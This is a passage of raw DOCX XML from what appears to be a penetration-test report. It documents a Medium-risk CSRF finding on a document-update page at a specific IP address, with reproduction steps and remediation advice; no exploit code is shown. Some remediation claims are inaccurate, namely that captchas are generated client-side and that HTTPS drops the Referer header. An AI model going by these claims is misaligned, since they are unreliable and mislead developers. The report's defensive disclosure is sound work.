          <w:p w:rsidR="005453D1" w:rsidRPr="00F8662B" w:rsidRDefault="00A81704" w:rsidP="005453D1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Remediation:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="005453D1" w:rsidRPr="005453D1">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Remove the file from production systems.</w:t>
            </w:r>
            <w:r w:rsidR="00F8662B">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="005453D1" w:rsidRPr="00F8662B">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Implement proper access control to restrict access to unauthorized resources.</w:t>
            </w:r>
            <w:r w:rsidR="00F8662B">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> Replace Stack Traces with generic messages.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="0062005A">
      <w:pPr>
        <w:ind w:right="-59"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="1152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919"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1921"/>
      </w:tblGrid>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9601" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00AB2226" w:rsidRDefault="00AB2226" w:rsidP="00AB2226">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Cross Site Request Forgery</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Risk Rating</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00AB2226" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Issue Count</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Source</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1921" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Dynamic Manual Analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="909"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00AB2226" w:rsidRPr="00AB2226" w:rsidRDefault="00AB2226" w:rsidP="00AB2226">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB2226">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">CSRF attacks force an authenticated victim's browser to send an unauthenticated request to a vulnerable web application, which then performs unauthorized action on behalf of the attacker. </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00AB2226" w:rsidP="00AB2226">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB2226">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application.)  This means a Web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="1165"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instance1</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r w:rsidR="00AB2226" w:rsidRPr="00AB2226">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/proj_doc_update.php</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r w:rsidR="00AB2226">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00AB2226">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="22"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Navigate to </w:t>
            </w:r>
            <w:r w:rsidR="00AB2226">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Docs menu with site admin privilege.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00AB2226" w:rsidRDefault="00AB2226" w:rsidP="00AB2226">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="22"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Select any of the Project Documentation item and Click on the </w:t>
            </w:r>
            <w:r w:rsidRPr="00AB2226">
              <w:rPr>
                <w:i/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Edit</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> Button.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00AB2226" w:rsidRDefault="00537422" w:rsidP="00AB2226">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="22"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Update the description, Title and Click on the Update File Button.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00802CE3" w:rsidRDefault="00537422" w:rsidP="00AB2226">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="22"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Observe that the CSRF protection token is absent in the request.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00537422" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0013E9A4" wp14:editId="596DE023">
                  <wp:extent cx="7245350" cy="32156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245350" cy="3215640"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Fig 1. </w:t>
            </w:r>
            <w:r w:rsidR="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>CSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00A81704" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Remediation:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00537422" w:rsidRPr="00537422">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Checking for Referral Header</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Checking for a referral header can help in preventing the CSRF. If the request is coming from some other domain, it must be the fake request so block it. Always allow requests coming from the same domain. This method fails if the website has open redirection vulnerabilities. Attackers can perform GET CSRF by using open redirection.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Now these days, most of the applications use HTTPS connection. In this the referrer will be omitted. So this method will not help if a website is using https. So, we will have to search another way.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Captcha Verification in forms</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>This is another nice way to prevent CSRF attacks on forms. Captcha verification process was initially developed to prevent BOT spam in forms. But it can also be helpful in preventing CSRF. As the captcha is generated on the client side randomly, an attacker cannot guess the pattern. So, he will never be able to send the correct Captcha with a fake request. And all fake requests will be blocked by a Captcha verification function.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>This method is not user friendly. Most of the users don’t want to fill the Captcha on the website. So, we should try to find ways that prevent CSRF vulnerability without adding any extra burdens on users.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Unpredictable Synchronizer Token Pattern</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>This is the most secure method for preventing CSRF. Unlike captcha verification, this method has nothing to do with users. So, users will never know that something has been added to protect them. In this method, the website generates a random token in each form as a hidden value. This token is associated with the users’ current session. Once the form is submitted, website verifies whether the random token comes via request. If yes, then verify whether it is right. By using this method, developers can easily identify whether the request was made by the user of attacker.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>&lt;/pre&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>&lt;form action="accountdelete.php" method="post"&gt;&lt;input type="hidden" name="CSRFToken" value="OWY4NmQdwODE4hODRjN2DQ2NTJlhMmZlYWEwYzU1KYWQwMTVhM2JmLNGYxYjJiMGI4jTZDE1ZDZjMTViMGYwMGEwOA==" /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>...&lt;/form&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>&lt;pre&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Strength of this method depends on the token generation method. So, always try to generate the token in the manner that it is always unpredictable.</w:t>
            </w:r>
          </w:p>
